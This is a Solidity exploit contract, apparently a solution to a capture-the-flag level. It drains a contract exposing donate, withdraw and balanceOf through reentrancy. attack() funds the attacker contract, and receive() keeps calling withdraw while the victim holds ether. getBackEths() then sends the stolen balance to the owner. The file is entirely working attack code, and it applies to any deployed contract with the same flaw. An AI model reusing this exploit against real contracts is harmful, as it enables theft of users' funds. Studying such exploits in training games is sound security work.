// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

import "hardhat/console.sol";

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
  function balanceOf(address _who) external view returns (uint balance);
}

contract AttackReentrance {
  using SafeMath for uint256;

  IReentrance public reentranceContract;
  
  address owner;
  uint256 donatedAmount;

  constructor(address _reentranceContract) public {
    owner = msg.sender;
    reentranceContract = IReentrance(_reentranceContract);
  }

  function attack() external payable {
    // Set up the attacker contract
    donatedAmount = msg.value;
    reentranceContract.donate{value: donatedAmount}(address(this));
    // Validating attacker contract is good to go
    uint balance = reentranceContract.balanceOf(address(this));
    require(balance == msg.value, "Something went wrong while funding the attacker contract");

    // Initiate the attack
    reentranceContract.withdraw(donatedAmount);
  }

  receive() external payable {
    uint reentranceContractETHBalance = address(reentranceContract).balance;
    if (reentranceContractETHBalance >= donatedAmount) {
      // reentering the victim contract
      reentranceContract.withdraw(donatedAmount);
    }
  }

  // This function is not part of the solution, but hey, when the level is completed we can claim back the ETHs spent on this level
  function getBackEths() external {
    require(msg.sender == owner, "Slow down little kooky, this are not your funds");
    (bool res, ) = payable(msg.sender).call{ value : address(this).balance }("");
    require(res, "Someone wrecked us bro");
  }
}